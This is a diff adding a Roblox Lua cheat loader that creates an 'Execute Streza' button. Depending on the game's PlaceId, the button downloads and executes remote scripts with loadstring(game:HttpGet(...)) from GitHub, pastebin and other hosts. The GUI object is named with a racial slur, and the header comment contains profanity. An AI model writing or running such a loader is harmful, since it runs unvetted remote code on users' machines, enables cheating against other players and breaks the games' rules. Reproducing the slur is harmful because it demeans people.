@@ -1,0 +1,41 @@
+
+--made by joe_engo fuckers!
+
+local d=Instance.new("ScreenGui")
+local _a=Instance.new("TextButton")d.Name="N1GG3R"
+d.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")_a.Name="Moan 4 Me"_a.Parent=d
+_a.BackgroundColor3=Color3.fromRGB(20,20,20)_a.BorderColor3=Color3.fromRGB(255,255,255)
+_a.Position=UDim2.new(0.00565681979,0,0.48881036,0)_a.Size=UDim2.new(0,246,0,45)
+_a.Font=Enum.Font.GothamBlack;_a.Text="Execute Streza"
+_a.TextColor3=Color3.fromRGB(255,255,255)_a.TextSize=20.000;_a.TextWrapped=true
+local function aa()
+local ba=Instance.new('LocalScript',_a)
+print("Streza Is Currently In [BETA] Join Our Discord @ https://discord.com/invite/avmWCq")
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==4623386862 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/PiggyHax/master/Piggy%20Hax.txt",true))()end
+wait(0.08)ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==606849621 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/JailedHax/master/PayPal.lua",true))()end
+wait(0.08)ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==920587237 then
+loadstring(game:HttpGet("http://stockerperso.me/scripts/haxxme.lua",true))()end;wait(0.08)
+ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==286090429 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/arsenalgui/master/script",true))()end
+wait(0.08)ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==171391948 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/vs/master/script",true))()end
+wait(0.08)ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()
+if game.PlaceId==1962086868 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RomanIsAFuckBoy/Romans-TOH-Crusher/master/Vermillion",true))()end;wait(0.08)
+ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==3956818381 then
+loadstring(game:HttpGet('https://system-exodus.com/scripts/ninjalegends/NinjaLegendsV3.lua',true))()end
+wait(0.08)ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==3527629287 then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/joeengo/bigpaintball/master/script',true))()end
+wait(0.08)ba.Parent.Parent.Parent:Destroy()end)
+ba.Parent.MouseButton1Click:Connect(function()if game.PlaceId==4651779470 then
+loadstring(game:HttpGet("https://pastebin.com/raw/VTwbr0pV"))()end;wait(0.08)
+ba.Parent.Parent.Parent:Destroy()end)end;coroutine.wrap(aa)()
